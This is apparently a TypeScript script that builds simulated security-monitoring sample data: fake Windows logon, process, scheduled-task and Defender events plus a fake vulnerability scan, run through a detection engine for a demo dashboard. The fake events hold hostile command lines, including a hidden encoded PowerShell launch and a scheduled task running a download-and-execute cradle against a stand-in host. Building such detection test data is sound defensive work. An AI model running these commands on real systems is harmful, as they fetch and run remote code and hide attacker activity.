// Generates the SAMPLE data embedded in the home-page workspace for visitors with no connected backend.
// Everything is simulated (hosts named DEMO-*, source "demo"), but it is pushed through the REAL detection and
// correlation engine, so the sample shows genuine engine output on fake input. Run: npx tsx scripts/make-soc-sample.ts out.json
import { writeFileSync } from "node:fs";
import { MemoryStore } from "../lib/soc/store";
import { ingestWindows, importScan } from "../lib/soc/pipeline";
import { incidentDetail, overview } from "../lib/soc/api";

const actor = { name: "sample-generator", role: "admin" };
const base = Date.now() - 95 * 60_000;
const at = (min: number) => new Date(base + min * 60_000).toISOString();
let rec = 5000;
const W = (host: string, id: number, min: number, data: Record<string, string>, extra: Record<string, unknown> = {}) =>
  ({ Id: id, RecordId: rec++, TimeCreated: at(min), ProviderName: "Microsoft-Windows-Security-Auditing", LogName: "Security", MachineName: host, Data: data, ...extra });

async function main() {
  const s = new MemoryStore();
  const ws = "DEMO-WS01", srv = "DEMO-SRV02";
  const ev1: unknown[] = [W(ws, 4624, 0, { TargetUserName: "alice", IpAddress: "10.20.0.31", LogonType: "2" }), W(ws, 4624, 12, { TargetUserName: "alice", IpAddress: "10.20.0.31", LogonType: "2" })];
  for (let i = 0; i < 12; i++) ev1.push(W(ws, 4625, 20 + i * 0.5, { TargetUserName: "administrator", IpAddress: "203.0.113.45", LogonType: "3", Status: "0xC000006D" }));
  ev1.push(W(ws, 4624, 28, { TargetUserName: "administrator", IpAddress: "203.0.113.45", LogonType: "3" }), W(ws, 4672, 28.2, { SubjectUserName: "administrator", PrivilegeList: "SeDebugPrivilege" }),
    W(ws, 4688, 31, { SubjectUserName: "administrator", NewProcessName: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", ParentProcessName: "C:\\Windows\\System32\\cmd.exe", CommandLine: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA" }),
    W(ws, 4698, 33, { SubjectUserName: "administrator", TaskName: "\\Microsoft\\Windows\\SystemUpdateCheck", TaskContent: "<Exec><Command>powershell.exe</Command><Arguments>-w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')</Arguments></Exec>" }),
    W(ws, 4720, 36, { SubjectUserName: "administrator", TargetUserName: "svc_backup2" }), W(ws, 4732, 37, { SubjectUserName: "administrator", TargetUserName: "Administrators", MemberName: "CN=svc_backup2" }),
    W(ws, 1102, 45, { SubjectUserName: "administrator" }, { ProviderName: "Microsoft-Windows-Eventlog" }));
  const ev2: unknown[] = [];
  ["alice", "bob", "carol", "dave", "erin", "frank", "svc_sql"].forEach((u, i) => ev2.push(W(srv, 4625, 50 + i * 0.7, { TargetUserName: u, IpAddress: "198.51.100.23", LogonType: "3" })));
  ev2.push(W(srv, 1116, 70, { "Threat Name": "Trojan:Win32/Sample.Demo", "Severity Name": "Severe", Path: "C:\\Users\\Public\\invoice.exe" }, { LogName: "Microsoft-Windows-Windows Defender/Operational", ProviderName: "Microsoft-Windows-Windows Defender" }),
    W(srv, 1117, 70.2, { "Threat Name": "Trojan:Win32/Sample.Demo", "Severity Name": "Severe", Path: "C:\\Users\\Public\\invoice.exe" }, { LogName: "Microsoft-Windows-Windows Defender/Operational", ProviderName: "Microsoft-Windows-Windows Defender" }));
  await ingestWindows(s, { host: ws, ips: ["10.20.0.15"], os: "Windows 11 (simulated)", events: ev1 as any }, "demo", actor);
  await ingestWindows(s, { host: srv, ips: ["10.20.0.20"], os: "Windows Server 2019 (simulated)", events: ev2 as any }, "demo", actor);
  const r = (ip: string, host: string, port: string, oid: string, name: string, sev: number, cve: string, sol: string, qod = 90) =>
    `<result><host>${ip}<hostname>${host}</hostname></host><port>${port}</port><nvt oid="${oid}"><name>${name}</name>${cve ? `<refs><ref type="cve" id="${cve}"/></refs>` : ""}<solution type="VendorFix">${sol}</solution></nvt><severity>${sev}</severity><threat>x</threat><qod><value>${qod}</value></qod></result>`;
  const xml = `<report><scan_end>${at(80)}</scan_end><results>` + [
    r("10.20.0.20", "demo-srv02", "445/tcp", "sample.1", "SMBv1 enabled (sample finding)", 9.3, "CVE-2017-0144", "Disable SMBv1 and apply the vendor security update."),
    r("10.20.0.20", "demo-srv02", "3389/tcp", "sample.2", "RDP exposed to the internet (sample finding)", 7.5, "", "Restrict RDP to a VPN or gateway and require MFA."),
    r("10.20.0.20", "demo-srv02", "443/tcp", "sample.3", "Deprecated TLS 1.0/1.1 enabled (sample finding)", 4.3, "", "Disable TLS 1.0 and 1.1.", 80),
    r("10.20.0.15", "demo-ws01", "445/tcp", "sample.4", "SMB signing not required (sample finding)", 5.3, "", "Require SMB signing via Group Policy."),
    r("10.20.0.15", "demo-ws01", "general/tcp", "sample.5", "Missing critical Windows update (sample finding)", 8.8, "CVE-2021-34527", "Install the latest cumulative update."),
    r("10.20.0.15", "demo-ws01", "5985/tcp", "sample.6", "WinRM over HTTP enabled (sample finding)", 5.0, "", "Use WinRM over HTTPS and restrict sources."),
  ].join("") + `</results></report>`;
  await importScan(s, xml, { attest: true, attestNote: "Simulated sample hosts", source: "demo" }, actor);
  const o = await overview(s);
  const details: Record<string, unknown> = {};
  for (const i of o.activeIncidents) { const d = await incidentDetail(s, i.id); details[i.id] = { incident: d.incident, timeline: d.timeline, actions: d.actions, alerts: d.alerts.map((a) => ({ id: a.id, ruleId: a.ruleId, title: a.title, severity: a.severity, host: a.host, entities: a.entities, mitre: a.mitre, lastSeen: a.lastSeen })) }; }
  const out = { generatedAt: o.generatedAt, overview: o, details };
  writeFileSync(process.argv[2], JSON.stringify(out));
  console.log("bytes", JSON.stringify(out).length, "incidents", o.activeIncidents.length, "alerts", o.recentAlerts.length, "events", o.recentEvents.length, "vulns", o.topVulns.length, "posture", o.posture);
}
main();
